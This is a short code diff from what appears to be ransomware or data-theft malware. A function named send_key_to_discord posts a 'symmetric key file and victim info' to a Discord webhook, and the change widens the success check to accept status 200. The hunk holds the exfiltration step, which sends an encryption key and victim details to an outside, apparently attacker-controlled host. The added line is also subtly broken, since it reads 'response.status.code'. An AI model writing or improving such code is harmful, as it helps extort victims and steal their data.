@@ -158,7 +158,7 @@ def send_key_to_discord():
         # Use 'payload_json' for the JSON part and 'files' for the file attachment
         response = requests.post(discord_webhook_url, data={'payload_json': json.dumps(data)}, files=files)
         
-        if response.status_code == 204:
+        if response.status_code == 204 or response.status.code == 200:
             print("Symmetric key file and victim info sent to Discord successfully.")
         else:
             print(f"Failed to send information to Discord. Status code: {response.status_code}")
